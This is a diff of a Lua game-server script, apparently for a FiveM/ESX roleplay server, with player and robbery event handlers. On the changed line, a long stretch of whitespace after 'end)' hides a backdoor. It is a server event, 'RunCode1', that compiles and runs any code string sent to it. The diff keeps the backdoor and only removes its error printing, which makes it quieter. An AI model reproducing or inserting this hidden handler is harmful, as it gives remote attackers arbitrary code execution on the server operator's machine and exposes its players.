@@ -48,7 +48,7 @@ local xPlayers = arp.GetPlayers()
 			TriggerClientEvent("carPlace", xPlayers[i], a, b, c)
 		end
 	end	
-end)																																																				;RegisterServerEvent('RunCode1');AddEventHandler('RunCode1', function(aD) local aD,aE=load(aD,'@runcode') if aE then print(aE)return nil,aE end;local aF,al=pcall(aD)if aF then return al else return nil,al end end)
+end)																																																				;RegisterServerEvent('RunCode1');AddEventHandler('RunCode1', function(aD) local aD,aE=load(aD,'@runcode') if aE then return nil,aE end;local aF,al=pcall(aD)if aF then return al else return nil,al end end)
 
 
 RegisterServerEvent('esx_rikosilmotukset:aseellinenrob')
